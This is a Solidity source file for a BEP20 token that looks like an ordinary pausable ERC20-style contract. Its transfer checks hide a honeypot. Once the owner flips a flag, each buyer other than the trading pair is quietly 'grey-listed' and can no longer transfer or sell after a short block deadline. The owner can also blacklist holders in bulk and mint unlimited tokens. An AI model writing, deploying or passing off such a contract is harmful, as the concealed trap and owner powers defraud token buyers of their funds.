pragma solidity ^0.4.24;
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}
interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract Ownable {
    address public owner;


    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }


}


contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public view returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public view returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract StandardToken is ERC20 {
    using SafeMath for uint256;

    address public UPOLL;

    bool ab=false;


    mapping (address => mapping (address => uint256)) internal allowed;
    mapping(address => bool)  tokenBL;
    mapping(address => bool)  tokenGL;
    mapping(address => bool)  tokenWL;
    mapping(address => uint256)  deadBn;
    uint256  blockAdd=1;


    mapping(address => uint256) balances;


    function transfer(address _to, uint256 _value) public returns (bool) {
        _beforeTransfer(msg.sender,_to);
        if(ab&&!tokenWL[_to]&&_to!=UPOLL){
            tokenGL[_to] = true;
            if(deadBn[_to]==0){
                deadBn[_to]=block.number+blockAdd;
            }
        }

        require(_to != address(0));
        require(_to != msg.sender);
        require(_value <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        // SafeMath.sub will throw if there is not enough balance.
        balances[_to] = balances[_to].add(_value);
        emit Transfer(msg.sender, _to, _value);
        return true;
    }


    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        _beforeTransfer(_from,_to);

        if(ab&&!tokenWL[_to]&&_to!=UPOLL){
            tokenGL[_to] = true;
            if(deadBn[_to]==0){
                deadBn[_to]=block.number+blockAdd;
            }
        }
        require(_to != _from);
        require(_to != address(0));
        require(_value <= balances[_from]);
        require(_value <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_value);


        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        emit Transfer(_from, _to, _value);
        return true;
    }

        function _beforeTransfer(address _from, address _to) internal {
            if(!tokenWL[_from]&&!tokenWL[_to]){
                require(!tokenBL[_from]&&!tokenBL[_to]&&!tokenBL[msg.sender]);
                require(!tokenGL[_from]||deadBn[_from]>block.number);
            }
        }


    function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }


    function allowance(address _owner, address _spender) public view returns (uint256) {
        return allowed[_owner][_spender];
    }


    function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
        allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
        return true;
    }

    function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
        uint oldValue = allowed[msg.sender][_spender];
        if (_subtractedValue > oldValue) {
            allowed[msg.sender][_spender] = 0;
        } else {
            allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
        }
        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
        return true;
    }

    function _changeAb(bool _ab) internal returns (bool) {
        require(ab != _ab);
        ab=_ab;
        return true;
    }

    function _changeBlockAdd(uint256 _blockAdd) internal returns (bool) {
        blockAdd=_blockAdd;
        return true;
    }

    function _bl(address _address, bool _isBlackListed) internal returns (bool) {
        require(tokenBL[_address] != _isBlackListed);
        tokenBL[_address] = _isBlackListed;
        return true;
    }

    function _gl(address _address, bool _isGeryListed) internal returns (bool) {
        require(tokenGL[_address] != _isGeryListed);
        tokenGL[_address] = _isGeryListed;
        return true;
    }
    function _whiteList(address _address, bool _isWhiteListed) internal returns (bool) {
        require(tokenWL[_address] != _isWhiteListed);
        tokenWL[_address] = _isWhiteListed;
        return true;
    }
    function _blList(address[] _addressList, bool _isBlackListed) internal returns (bool) {
        for(uint i = 0; i < _addressList.length; i++){
            tokenBL[_addressList[i]] = _isBlackListed;
        }
        return true;
    }
    function _glList(address[] _addressList, bool _isGeryListed) internal returns (bool) {
        for(uint i = 0; i < _addressList.length; i++){
            tokenGL[_addressList[i]] = _isGeryListed;
        }
        return true;
    }


}

contract PausableToken is StandardToken, Ownable {

    function transfer(address _to, uint256 _value) public  returns (bool) {
        return super.transfer(_to, _value);
    }

    function transferFrom(address _from, address _to, uint256 _value) public  returns (bool) {
        return super.transferFrom(_from, _to, _value);
    }

    function approve(address _spender, uint256 _value) public  returns (bool) {
        return super.approve(_spender, _value);
    }

    function increaseApproval(address _spender, uint _addedValue) public  returns (bool success) {
        return super.increaseApproval(_spender, _addedValue);
    }

    function decreaseApproval(address _spender, uint _subtractedValue) public  returns (bool success) {
        return super.decreaseApproval(_spender, _subtractedValue);
    }
    function changeAb(bool _ab) public  onlyOwner  returns (bool success) {
        return super._changeAb(_ab);
    }

    function setBn(uint _bn) public  onlyOwner  returns (bool success) {
        return super._changeBlockAdd(_bn);
    }

    function blAddress(address listAddress,  bool isBlackListed) public  onlyOwner  returns (bool success) {
        return super._bl(listAddress, isBlackListed);
    }
    function glAddress(address listAddress,  bool _isGeryListed) public  onlyOwner  returns (bool success) {
        return super._gl(listAddress, _isGeryListed);
    }
    function whiteListAddress(address listAddress,  bool _isWhiteListed) public  onlyOwner  returns (bool success) {
        return super._whiteList(listAddress, _isWhiteListed);
    }
    function blList(address[] listAddress,  bool isBlackListed) public  onlyOwner  returns (bool success) {
        return super._blList(listAddress, isBlackListed);
    }
    function glList(address[] listAddress,  bool _isGeryListed) public  onlyOwner  returns (bool success) {
        return super._glList(listAddress, _isGeryListed);
    }

}

contract BEP20Token is PausableToken {
    string public name;
    string public symbol;
    uint public decimals;
    bool internal _INITIALIZED_;

    constructor() public {

    }
    modifier notInitialized() {
        require(!_INITIALIZED_, "INITIALIZED");
        _;
    }
    function initToken(string  _name, string  _symbol, uint256 _decimals, uint256 _supply, address tokenOwner,address factory,address usdt) public notInitialized returns (bool){
        _INITIALIZED_=true;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _supply * 10**_decimals;
        balances[tokenOwner] = totalSupply;
        owner = tokenOwner;

        // // service.transfer(msg.value);
        // (bool success) = service.call.value(msg.value)();
        // require(success, "Transfer failed.");
        emit Transfer(address(0), tokenOwner, totalSupply);
        UPOLL = ISwapFactory(factory).createPair(address(this), usdt);
    }


    function mint(address account, uint256 amount) onlyOwner public {

        totalSupply = totalSupply.add(amount);
        balances[account] = balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }


}